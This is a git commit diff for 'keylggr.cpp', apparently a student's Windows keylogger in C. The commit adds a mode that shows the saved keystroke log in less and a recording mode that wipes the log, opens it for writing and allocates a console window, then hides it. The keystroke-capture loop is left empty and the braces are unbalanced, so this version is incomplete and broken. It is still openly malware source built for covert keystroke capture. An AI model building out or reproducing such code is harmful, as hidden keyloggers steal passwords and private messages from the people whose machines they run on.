02ca9ec3ac3346ff22e0bbe5dac9019732fe6e36
Alex Wang <alex-wang@DESKTOP-E2KC4VG>
2022-12-14 09:11:55 -0500

    -l option finished, got can be retrieved. working on -r option

--- keylggr.cpp
+++ keylggr.cpp
@@ -1,23 +1,82 @@
 #include <getopt.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <windows.h>
+#include <winuser.h>
+#include <unistd.h>
 
+#define CLN_OPT  "rm -f output.txt"
+#define CONS_WIN "ConsoleWindowClass"
 #define OPT_FILE "output.txt"
 #define OPT_STR  "lr"
-#define CLN_OPT  "rm -f output.txt"
 
+// prints error message and exits the program.
 void errexit (const char *errmsg) {
   printf ("%s\n", errmsg);
   exit (EXIT_FAILURE);
 }
 
+// opens the last record of .output in less.
+void lopen () {
+  FILE *fptr = popen ("less", "w");
+  FILE *lptr = fopen (OPT_FILE, "r");
+  char *line = NULL;
+  int status;
+  size_t len = 0;
+  ssize_t nread;
+  
+  // checking for error opening files.
+  if (fptr == NULL || lptr == NULL) {
+    errexit ("Error Opening File.");
+  }
+  
+  // reading input from log into fptr.
+  while ((nread = getline (&line, &len, lptr)) != -1) {
+    fwrite (line, nread, 1, fptr);
+  }
+  
+  // closing the file pointers.
+  fclose (lptr);
+  status = pclose(fptr);
+  if (status == -1) {
+    errexit ("Error Closing File.");
+  }
+}
+
+// records new keystrokes.
+void rmode () {
+  FILE *lptr = NULL;
+  HWND window = NULL;
+  char c;
+  
+  // cleans the last record of .output so that new keystrokes can be logged.
+  system (CLN_OPT);
+  
+  // initializing lptr (the log where keystrokes are stored).
+  if ((lptr = fopen (OPT_FILE, "w")) == NULL) {
+    errexit ("Error Opening File.");
+  }
+  
+  // allocating new window for keylogging.
+  AllocConsole();
+  window = FindWindowA (CONS_WIN, NULL);
+  if (window == NULL) {
+    errexit ("Window Creation Failed.");
+  }
+  ShowWindow (window, 0);
+  
+  // keylogging.
+  while (true) {
+    
+}
+
+// main method: parses the command line arguments and takes appropriate action
 int main (int argc, char **argv) {
   int opt = 0;
   int lflag = 0; // get log of the last keystrokes stored by keylggr
   int rflag = 0; // re-initialize keylggr (clearing out old data)
   
   // clean previous output if it exists.
-  system (CLN_OPT);
   
   // parse command line arguments.
   while ((opt = getopt (argc, argv, OPT_STR)) != EOF) {
@@ -29,27 +88,24 @@ int main (int argc, char **argv) {
         rflag++;
         break;
       default:
-        errexit ("INVALID ARGS: usage ./keylggr <-l | -r>");
+        errexit ("INVALID ARGS: usage ./keylggr <-l | -r &>");
     }
   }
   
   // validate command line argumets: should be either -l or -r, NOT both.
   if (!(lflag ^ rflag)) {
-    errexit ("INVALID ARGS: usage ./keylggr <-1 | -r>");
+    errexit ("INVALID ARGS: usage ./keylggr <-1 | -r &>");
   }
   
   // if l flag is set, retrieve the log of the last keystrokes stored.
-  // TODO create l mode function.
   if (lflag) {
-    printf ("L");
+    lopen ();
   }
   
   // if r mode is set, clear previously stored keystrokes and record new strokes.
-  // TODO create r mode function.
   if (rflag) {
-    printf ("R");
+    rmode ();
   }
   
   exit (EXIT_SUCCESS);
-  
 }
